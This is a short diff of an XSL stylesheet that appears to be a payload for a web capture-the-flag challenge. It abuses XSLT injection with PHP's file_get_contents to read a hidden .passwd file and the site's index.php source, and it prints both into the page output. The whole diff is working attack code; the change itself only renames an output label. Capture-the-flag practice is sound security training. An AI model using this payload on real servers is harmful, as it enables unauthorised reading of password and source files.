@@ -6,7 +6,7 @@ xmlns:php="http://php.net/xsl"
 <xsl:param  name="strscand"   select="php:function('file_get_contents','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826ffcdee/.passwd')" /> 
 <xsl:param  name="header"     select="php:function('file_get_contents','/challenge/web-serveur/ch50/index.php')" />
 <xsl:template match="/">	
-PHPINFO:<xsl:value-of select="$strscand"/>
+.passwd:<xsl:value-of select="$strscand"/>
 DIR1 index.php:<xsl:value-of select="$header"/>   
 <xsl:value-of select="name"/>
  <div style="background-color:teal;color:white;padding:4px">
